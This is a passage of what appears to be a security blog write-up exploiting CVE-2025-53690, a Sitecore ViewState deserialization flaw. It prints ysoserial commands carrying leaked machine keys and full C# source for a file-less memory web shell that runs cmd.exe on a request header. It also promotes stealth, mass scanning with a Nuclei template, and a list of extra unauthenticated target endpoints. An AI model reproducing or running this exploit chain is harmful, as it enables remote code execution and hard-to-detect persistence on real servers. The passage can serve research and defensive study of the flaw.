</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ysoserial.exe -p ViewState -g XamlAssemblyLoadFromFile -c <span class=s2>&#34;ExploitClass.cs;System.Web.dll;System.dll&#34;</span> --path<span class=o>=</span>/sitecore/blocked.aspx --decryptionkey<span class=o>=</span><span class=s2>&#34;0DAC68D020B8193DF0FCEE1BAF7A07B4B0D40DCD3E5BA90D&#34;</span> --validationalg<span class=o>=</span><span class=s2>&#34;SHA1&#34;</span> --validationkey<span class=o>=</span><span class=s2>&#34;BDDFE367CD36AAA81E195761BEFB073839549FF7B8E34E42C0DEA4600851B0065856B211719ADEFC76F3F3A556BC61A5FC8C9F28F958CB1D3BD8EF9518143DB6&#34;</span>
</span></span></code></pre></td></tr></table></div></div><p>After sending the payload with the <code>cmd</code> header value set to <code>dir</code>, we get the response:</p><p><img src=/p/cve-2025-53690/image40.png width=3177 height=1675 srcset="/p/cve-2025-53690/image40_hu_527ce9fc39a05a01.png 480w, /p/cve-2025-53690/image40_hu_617184351f89483b.png 1024w" loading=lazy class=gallery-image data-flex-grow=189 data-flex-basis=455px></p><p>Thus, we have successfully achieved the goal of echoing the command output in the response.</p><hr><p>The story doesn&rsquo;t end there :D The exploit above still has a significant limitation: <strong>Every time you want to exploit (run a command), you have to send a request to the aforementioned endpoint with a very large VIEWSTATE</strong>, which makes it easier to be detected â‡’ <strong>Not suitable for Red Team campaigns</strong>.</p><p>So, is there a way to mitigate this? The answer is <strong>MemShell</strong> :D</p><p>In previous blogs from <strong>sec.vnpt.vn</strong>, we&rsquo;ve learned about various types of MemShells in <strong>Java</strong>, <strong>.NET MVC</strong>, etc. But what about <strong>WebForms</strong>? Is there a similar mechanism? :D Let&rsquo;s dive deeper!</p><h3 id=memshell>MemShell</h3><p><strong>First, what is MemShell?</strong></p><p><strong>MemShell</strong> (short for <strong>Memory Shell</strong>) is a technique used to <strong>maintain persistent access</strong> to the target system <strong>without writing any files</strong>. Instead of deploying a traditional webshell (like an .aspx or .jsp file), MemShell operates <strong>entirely in the web application&rsquo;s memory</strong>, leveraging framework or runtime components to execute malicious code <strong>without leaving any physical traces</strong> on the system. This makes MemShell a powerful tool that is <strong>extremely hard to detect</strong> by traditional security tools like antivirus or file-monitoring systems.</p><p>At its core, the <strong>MemShell technique</strong> injects code into components of the <strong>request pipeline</strong> (such as Filters, middleware, routing, etc.). Then, when the request pipeline reaches the attacker&rsquo;s injected logic â‡’ <strong>arbitrary code is executed on the server</strong>.</p><p>You can refer to previous articles on MemShell in Tomcat and .NET MVC here: ðŸ”— <a class=link href=https://sec.vnpt.vn/2022/12/ky-thuat-memory-webshell-trong-cac-dot-khai-thac-redteam target=_blank rel=noopener>https://sec.vnpt.vn/2022/12/ky-thuat-memory-webshell-trong-cac-dot-khai-thac-redteam</a> ðŸ”— <a class=link href=https://sec.vnpt.vn/2024/10/asp-net-mvc-memmory-webshell-filter target=_blank rel=noopener>https://sec.vnpt.vn/2024/10/asp-net-mvc-memmory-webshell-filter</a></p><p>Although both belong to the <strong>ASP.NET family</strong>, <strong>ASP.NET WebForms does not have a Filter mechanism</strong> in the request pipeline. Therefore, we need to find <strong>another similar mechanism</strong>.</p><p>After some digging, I discovered a mechanism in the <strong>WebForms request pipeline</strong> that can be exploited: <strong>Routing</strong>.</p><p><img src=/p/cve-2025-53690/routing.png width=624 height=410 srcset="/p/cve-2025-53690/routing_hu_72646b3062b1cde.png 480w, /p/cve-2025-53690/routing_hu_b235dedf62b2c2c9.png 1024w" loading=lazy class=gallery-image data-flex-grow=152 data-flex-basis=365px></p><p><strong>Routing in Web Forms</strong> (introduced in .NET 4.0) was created to generate <strong>friendly URLs</strong> (URLs without the .aspx extension), improving <strong>SEO</strong> while preserving the traditional <strong>Page model</strong>. For example, instead of /upload.aspx â‡’ we can configure routing so that /upload maps directly to that .aspx file. The URL no longer has .aspx â‡’ <strong>more user-friendly</strong>.</p><hr><h3 id=overview-of-the-request-pipeline-in-aspnet>Overview of the Request Pipeline in ASP.NET</h3><p>When an HTTP request is sent to an ASP.NET application:</p><ol><li><strong>IIS</strong> receives the HTTP request.</li><li>IIS forwards the request to the <strong>ASP.NET ISAPI extension</strong> (in <strong>Classic mode</strong>) or the <strong>ASP.NET Integrated pipeline module</strong> (in <strong>Integrated mode</strong>).</li><li>The request enters the <strong>ASP.NET Request Pipeline</strong>, which includes:<ul><li>Events of the <code>HttpApplication</code> (such as <code>BeginRequest</code>, <code>AuthenticateRequest</code>, <code>AuthorizeRequest</code>, <code>ResolveRequestCache</code>, â€¦).</li><li><strong>HttpModules</strong> (modules that can &ldquo;hook into&rdquo; the above events).</li><li><strong>HttpHandlers</strong> (responsible for actual processing and returning the response to the client).</li></ul></li></ol><h3 id=where-does-routing-appear-in-the-pipeline>Where Does Routing Appear in the Pipeline?</h3><p>The <strong>Routing module</strong> (<code>UrlRoutingModule</code>) is attached to the pipeline at the <strong>PostResolveRequestCache</strong> stage.<br>At this point, it checks the incoming URL to see if it matches any route defined in <code>RouteTable.Routes</code>.</p><p>If a matching route is found:</p><ul><li><code>UrlRoutingModule</code> creates a <strong><code>RouteData</code></strong> object.</li><li>It assigns a specific <strong><code>IRouteHandler</code></strong> to handle the request.</li><li>The request is then passed to the corresponding <strong><code>HttpHandler</code></strong> (e.g., <code>PageRouteHandler</code> in Web Forms).</li></ul><h3 id=execution-flow-of-routing>Execution Flow of Routing:</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-csharp data-lang=csharp><span class=line><span class=cl><span class=n>IIS</span> <span class=err>â†’</span> <span class=n>ASP</span><span class=p>.</span><span class=n>NET</span> <span class=n>Pipeline</span>
</span></span><span class=line><span class=cl>     <span class=err>â†“</span>
</span></span><span class=line><span class=cl> <span class=n>UrlRoutingModule</span> <span class=p>(</span><span class=n>PostResolveRequestCache</span><span class=p>)</span>
</span></span><span class=line><span class=cl>     <span class=err>â†“</span>
</span></span><span class=line><span class=cl> <span class=n>Find</span> <span class=n>matching</span> <span class=n>RouteData</span>
</span></span><span class=line><span class=cl>     <span class=err>â†“</span>
</span></span><span class=line><span class=cl> <span class=n>Call</span> <span class=n>corresponding</span> <span class=n>IRouteHandler</span>
</span></span><span class=line><span class=cl>     <span class=err>â†“</span>
</span></span><span class=line><span class=cl> <span class=n>PageRouteHandler</span> <span class=n>returns</span> <span class=n>PageHandler</span> <span class=p>(.</span><span class=n>aspx</span><span class=p>)</span>
</span></span><span class=line><span class=cl>     <span class=err>â†“</span>
</span></span><span class=line><span class=cl> <span class=n>Execute</span> <span class=n>Page</span> <span class=n>Lifecycle</span>
</span></span><span class=line><span class=cl>     <span class=err>â†“</span>
</span></span><span class=line><span class=cl> <span class=n>Send</span> <span class=n>response</span> <span class=n>back</span> <span class=n>to</span> <span class=n>client</span>
</span></span></code></pre></td></tr></table></div></div><p>Typically, these routes can be configured in the <code>Global.asax</code> file. Example:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-csharp data-lang=csharp><span class=line><span class=cl><span class=k>void</span> <span class=n>Application_Start</span><span class=p>(</span><span class=kt>object</span> <span class=n>sender</span><span class=p>,</span> <span class=n>EventArgs</span> <span class=n>e</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>RegisterRoutes</span><span class=p>(</span><span class=n>RouteTable</span><span class=p>.</span><span class=n>Routes</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>void</span> <span class=n>RegisterRoutes</span><span class=p>(</span><span class=n>RouteCollection</span> <span class=n>routes</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>routes</span><span class=p>.</span><span class=n>MapPageRoute</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=n>routeName</span><span class=p>:</span> <span class=s>&#34;ProductRoute&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>routeUrl</span><span class=p>:</span> <span class=s>&#34;products/{category}/{id}&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>physicalFile</span><span class=p>:</span> <span class=s>&#34;~/ProductDetails.aspx&#34;</span>
</span></span><span class=line><span class=cl>    <span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>However, in addition to the above method, we can also <strong>dynamically configure routes</strong> using the following code:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-csharp data-lang=csharp><span class=line><span class=cl><span class=k>using</span> <span class=nn>System.Web.Routing</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>void</span> <span class=n>AddDynamicRoute</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>RouteCollection</span> <span class=n>routes</span> <span class=p>=</span> <span class=n>RouteTable</span><span class=p>.</span><span class=n>Routes</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>routes</span><span class=p>.</span><span class=n>MapPageRoute</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=n>routeName</span><span class=p>:</span> <span class=s>&#34;DynamicRoute&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>routeUrl</span><span class=p>:</span> <span class=s>&#34;promo/{code}&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>physicalFile</span><span class=p>:</span> <span class=s>&#34;~/PromoPage.aspx&#34;</span>
</span></span><span class=line><span class=cl>    <span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Moreover, we can create a <strong>Custom Route</strong> with logic defined by ourselves by <strong>overriding</strong> the two methods <code>GetRouteData</code> and <code>GetVirtualPath</code>, for example:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-csharp data-lang=csharp><span class=line><span class=cl><span class=kd>public</span> <span class=k>class</span> <span class=nc>MyRoute</span> <span class=p>:</span> <span class=n>RouteBase</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kd>public</span> <span class=kd>override</span> <span class=n>RouteData</span> <span class=n>GetRouteData</span><span class=p>(</span><span class=n>HttpContextBase</span> <span class=n>httpContext</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=kt>var</span> <span class=n>url</span> <span class=p>=</span> <span class=n>httpContext</span><span class=p>.</span><span class=n>Request</span><span class=p>.</span><span class=n>AppRelativeCurrentExecutionFilePath</span><span class=p>.</span><span class=n>TrimStart</span><span class=p>(</span><span class=sc>&#39;~&#39;</span><span class=p>,</span> <span class=sc>&#39;/&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>url</span><span class=p>.</span><span class=n>Equals</span><span class=p>(</span><span class=s>&#34;promo&#34;</span><span class=p>,</span> <span class=n>StringComparison</span><span class=p>.</span><span class=n>OrdinalIgnoreCase</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=kt>var</span> <span class=n>routeData</span> <span class=p>=</span> <span class=k>new</span> <span class=n>RouteData</span><span class=p>(</span><span class=k>this</span><span class=p>,</span> <span class=k>new</span> <span class=n>PageRouteHandler</span><span class=p>(</span><span class=s>&#34;~/PromoPage.aspx&#34;</span><span class=p>));</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>routeData</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>null</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=kd>public</span> <span class=kd>override</span> <span class=n>VirtualPathData</span> <span class=n>GetVirtualPath</span><span class=p>(</span><span class=n>RequestContext</span> <span class=n>requestContext</span><span class=p>,</span> <span class=n>RouteValueDictionary</span> <span class=n>values</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>null</span><span class=p>;</span> <span class=c1>// optional</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Then register this route using:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>RouteTable.Routes.Insert(0, new MyRoute());
</span></span></code></pre></td></tr></table></div></div><p>Here, instead of using <code>Routes.Add</code>, we use <code>Routes.Insert</code> because:</p><p>When using <code>Routes.Insert</code>, we can <strong>control the position</strong> where this route is inserted into the <code>RouteTable</code>. When using <code>**Insert(0, â€¦)**</code>, this route will be <strong>placed at the top</strong> of the <code>RouteTable</code> â‡’ our custom route logic will be <strong>processed first</strong> when the pipeline loops through the <code>RouteTable</code> to find a matching route.</p><p>From there, we can <strong>leverage this mechanism</strong> to <strong>inject malicious payloads</strong> (execute commands, read files, etc.) directly into the <code>GetRouteData</code> method of the route we define.</p><p>The Payload file is as follows:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-csharp data-lang=csharp><span class=line><span class=cl><span class=c1>// ExploitClass was renamed to E to reduce the size a little bit</span>
</span></span><span class=line><span class=cl><span class=k>using</span> <span class=nn>System.Web</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>using</span> <span class=nn>System.Web.Routing</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>E</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kd>public</span> <span class=n>E</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>RouteCollection</span> <span class=n>routes</span> <span class=p>=</span> <span class=n>RouteTable</span><span class=p>.</span><span class=n>Routes</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>routes</span><span class=p>.</span><span class=n>Insert</span><span class=p>(</span><span class=m>0</span><span class=p>,</span> <span class=p>(</span><span class=n>RouteBase</span><span class=p>)</span><span class=k>new</span> <span class=n>MyRoute</span><span class=p>());</span>
</span></span><span class=line><span class=cl>        <span class=n>System</span><span class=p>.</span><span class=n>Web</span><span class=p>.</span><span class=n>HttpContext</span><span class=p>.</span><span class=n>Current</span><span class=p>.</span><span class=n>Response</span><span class=p>.</span><span class=n>End</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=kd>public</span> <span class=k>class</span> <span class=nc>MyRoute</span> <span class=p>:</span> <span class=n>RouteBase</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=kd>public</span> <span class=kd>override</span> <span class=n>RouteData</span> <span class=n>GetRouteData</span><span class=p>(</span><span class=n>HttpContextBase</span> <span class=n>httpContext</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=kt>string</span> <span class=n>Payload</span> <span class=p>=</span> <span class=n>httpContext</span><span class=p>.</span><span class=n>Request</span><span class=p>.</span><span class=n>Headers</span><span class=p>[</span><span class=s>&#34;cmd&#34;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=n>Payload</span> <span class=p>!=</span> <span class=kc>null</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=n>System</span><span class=p>.</span><span class=n>Diagnostics</span><span class=p>.</span><span class=n>Process</span> <span class=n>process</span> <span class=p>=</span> <span class=k>new</span> <span class=n>System</span><span class=p>.</span><span class=n>Diagnostics</span><span class=p>.</span><span class=n>Process</span><span class=p>();</span>
</span></span><span class=line><span class=cl>                <span class=n>process</span><span class=p>.</span><span class=n>StartInfo</span><span class=p>.</span><span class=n>FileName</span> <span class=p>=</span> <span class=s>&#34;cmd.exe&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=n>process</span><span class=p>.</span><span class=n>StartInfo</span><span class=p>.</span><span class=n>Arguments</span> <span class=p>=</span> <span class=s>&#34;/c &#34;</span> <span class=p>+</span> <span class=n>Payload</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=n>process</span><span class=p>.</span><span class=n>StartInfo</span><span class=p>.</span><span class=n>UseShellExecute</span> <span class=p>=</span> <span class=kc>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=n>process</span><span class=p>.</span><span class=n>StartInfo</span><span class=p>.</span><span class=n>RedirectStandardOutput</span> <span class=p>=</span> <span class=kc>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=n>process</span><span class=p>.</span><span class=n>StartInfo</span><span class=p>.</span><span class=n>RedirectStandardError</span> <span class=p>=</span> <span class=kc>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=n>process</span><span class=p>.</span><span class=n>StartInfo</span><span class=p>.</span><span class=n>CreateNoWindow</span> <span class=p>=</span> <span class=kc>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=n>process</span><span class=p>.</span><span class=n>Start</span><span class=p>();</span>
</span></span><span class=line><span class=cl>                <span class=kt>string</span> <span class=n>output</span> <span class=p>=</span> <span class=n>process</span><span class=p>.</span><span class=n>StandardOutput</span><span class=p>.</span><span class=n>ReadToEnd</span><span class=p>();</span>
</span></span><span class=line><span class=cl>                <span class=n>System</span><span class=p>.</span><span class=n>Web</span><span class=p>.</span><span class=n>HttpContext</span><span class=p>.</span><span class=n>Current</span><span class=p>.</span><span class=n>Response</span><span class=p>.</span><span class=n>Write</span><span class=p>(</span><span class=n>output</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=n>System</span><span class=p>.</span><span class=n>Web</span><span class=p>.</span><span class=n>HttpContext</span><span class=p>.</span><span class=n>Current</span><span class=p>.</span><span class=n>Response</span><span class=p>.</span><span class=n>End</span><span class=p>();</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=kc>null</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=kd>public</span> <span class=kd>override</span> <span class=n>VirtualPathData</span> <span class=n>GetVirtualPath</span><span class=p>(</span><span class=n>RequestContext</span> <span class=n>requestContext</span><span class=p>,</span> <span class=n>RouteValueDictionary</span> <span class=n>values</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=kc>null</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p><strong>Explanation of the payload above:</strong></p><p>Here, we create a <code>MyRoute</code> class that contains the command execution payload inside the <code>GetRouteData</code> method. This method checks if the request header contains a <code>cmd</code> header. If it does, it will execute the <code>cmd</code> command based on the value of that header. If the header is not present, it skips and returns null â‡’ <strong>does not affect the logic of other routes</strong>, and the application continues to function normally â‡’ <strong>much harder to detect</strong>.</p><p>In reality, both GetRouteData and GetVirtualPath methods can be used to execute arbitrary code. However, in the request pipeline, <strong>GetRouteData is executed before GetVirtualPath</strong>, so we will use GetRouteData here.</p><p>Then, in the E class, we initialize a <strong>RouteCollection</strong> object and <strong>insert MyRoute into the RouteTable at the very first position</strong>.</p><p>Save the above file as <strong>MemShellClass.cs</strong> in the ysoserial.net directory. Then run the following command to generate the payload:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-csharp data-lang=csharp><span class=line><span class=cl><span class=n>ysoserial</span><span class=p>.</span><span class=n>exe</span> <span class=p>-</span><span class=n>p</span> <span class=n>ViewState</span> <span class=p>-</span><span class=n>g</span> <span class=n>XamlAssemblyLoadFromFile</span> <span class=p>-</span><span class=n>c</span> <span class=s>&#34;MemShellClass.cs;System.Web.dll;System.dll&#34;</span> <span class=p>--</span><span class=n>path</span><span class=p>=/</span><span class=n>sitecore</span><span class=p>/</span><span class=n>blocked</span><span class=p>.</span><span class=n>aspx</span> <span class=p>--</span><span class=n>decryptionkey</span><span class=p>=</span><span class=s>&#34;0DAC68D020B8193DF0FCEE1BAF7A07B4B0D40DCD3E5BA90D&#34;</span> <span class=p>--</span><span class=n>validationalg</span><span class=p>=</span><span class=s>&#34;SHA1&#34;</span> <span class=p>--</span><span class=n>validationkey</span><span class=p>=</span><span class=s>&#34;BDDFE367CD36AAA81E195761BEFB073839549FF7B8E34E42C0DEA4600851B0065856B211719ADEFC76F3F3A556BC61A5FC8C9F28F958CB1D3BD8EF9518143DB6&#34;</span>
</span></span></code></pre></td></tr></table></div></div><p>After sending the payload, we receive a <strong>200 response</strong>:</p><p><img src=/p/cve-2025-53690/image41.png width=3164 height=1653 srcset="/p/cve-2025-53690/image41_hu_8d138877573e97f9.png 480w, /p/cve-2025-53690/image41_hu_e9f55f2e0a474d10.png 1024w" loading=lazy class=gallery-image data-flex-grow=191 data-flex-basis=459px></p><p>Now, we can send a request to <strong>any route</strong> and set the <strong><code>cmd</code> header</strong> to the payload we want to execute in order to run <strong>arbitrary commands</strong>:</p><p><img src=/p/cve-2025-53690/image42.png width=3176 height=1666 srcset="/p/cve-2025-53690/image42_hu_9d8f229079a879.png 480w, /p/cve-2025-53690/image42_hu_eca8a16222818efe.png 1024w" loading=lazy class=gallery-image data-flex-grow=190 data-flex-basis=457px></p><hr><h3 id=honorable-mention>Honorable Mention</h3><p>From the basic payload that only modifies the <strong>Response Header</strong>, we can create a <strong>Nuclei template</strong> to <strong>scan in bulk</strong> by sending the generated <strong>VIEWSTATE</strong> and checking if the response contains the string we define.</p><p>The template is available here: <strong><a class=link href=https://github.com/ErikLearningSec/CVE-2025-53690-POC target=_blank rel=noopener>https://github.com/ErikLearningSec/CVE-2025-53690-POC</a></strong>
In this template, we&rsquo;ll write it a bit differently. Instead of exploiting via the endpoint <code>/blocked.aspx</code>, we&rsquo;ll exploit via the endpoint <code>/sitecore/default.aspx</code> because this is an endpoint that always exists on Sitecore instances â‡’ increasing the scan hit rate and reducing the chance of detection.</p><p><img src=/p/cve-2025-53690/nuclei.png width=799 height=351 srcset="/p/cve-2025-53690/nuclei_hu_aabb80112929c502.png 480w, /p/cve-2025-53690/nuclei_hu_16e538bb28146877.png 1024w" loading=lazy class=gallery-image data-flex-grow=227 data-flex-basis=546px></p><hr><h3 id=honorable-mention-2>Honorable Mention #2</h3><p>Although the entire analysis focuses on attacking the <strong><code>/sitecore/blocked.aspx</code></strong> endpoint as mentioned in <strong>Mandiant&rsquo;s blog</strong>, we can also exploit <strong>other endpoints</strong>, as long as they are <strong>unauthenticated</strong> and <strong>contain VIEWSTATE in the response</strong>.</p><p>After listing <code>.aspx</code> files in the <strong>webroot</strong> and fuzzing with <strong>Intruder</strong>, we obtained the following list:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-csharp data-lang=csharp><span class=line><span class=cl><span class=p>/</span><span class=n>Default</span><span class=p>.</span><span class=n>aspx</span>
</span></span><span class=line><span class=cl><span class=p>/</span><span class=n>layouts</span><span class=p>/</span><span class=n>Sample</span> <span class=n>layout</span><span class=p>.</span><span class=n>aspx</span>
</span></span><span class=line><span class=cl><span class=p>/</span><span class=n>layouts</span><span class=p>/</span><span class=n>system</span><span class=p>/</span><span class=n>VIChecker</span><span class=p>.</span><span class=n>aspx</span>
</span></span><span class=line><span class=cl><span class=p>/</span><span class=n>layouts</span><span class=p>/</span><span class=n>system</span><span class=p>/</span><span class=n>VisitorIdentificationCss</span><span class=p>.</span><span class=n>aspx</span>
</span></span><span class=line><span class=cl><span class=p>/</span><span class=n>sitecore</span><span class=p>/</span><span class=k>default</span><span class=p>.</span><span class=n>aspx</span>
</span></span><span class=line><span class=cl><span class=p>/</span><span class=n>sitecore</span><span class=p>/</span><span class=n>debug</span><span class=p>/</span><span class=k>default</span><span class=p>.</span><span class=n>aspx</span>
</span></span><span class=line><span class=cl><span class=p>/</span><span class=n>sitecore</span><span class=p>/</span><span class=n>login</span><span class=p>/</span><span class=k>default</span><span class=p>.</span><span class=n>aspx</span>
</span></span><span class=line><span class=cl><span class=p>/</span><span class=n>sitecore</span><span class=p>/</span><span class=n>service</span><span class=p>/</span><span class=n>error</span><span class=p>.</span><span class=n>aspx</span>
</span></span><span class=line><span class=cl><span class=p>/</span><span class=n>sitecore</span><span class=p>/</span><span class=n>service</span><span class=p>/</span><span class=n>Heartbeat</span><span class=p>.</span><span class=n>aspx</span>
</span></span><span class=line><span class=cl><span class=p>/</span><span class=n>sitecore</span><span class=p>/</span><span class=n>service</span><span class=p>/</span><span class=n>keepalive</span><span class=p>.</span><span class=n>aspx</span>
</span></span><span class=line><span class=cl><span class=p>/</span><span class=n>sitecore</span><span class=p>/</span><span class=n>service</span><span class=p>/</span><span class=n>noaccess</span><span class=p>.</span><span class=n>aspx</span>
</span></span><span class=line><span class=cl><span class=p>/</span><span class=n>sitecore</span><span class=p>/</span><span class=n>service</span><span class=p>/</span><span class=n>nolayout</span><span class=p>.</span><span class=n>aspx</span>
</span></span><span class=line><span class=cl><span class=p>/</span><span class=n>sitecore</span><span class=p>/</span><span class=n>service</span><span class=p>/</span><span class=n>nolicense</span><span class=p>.</span><span class=n>aspx</span>
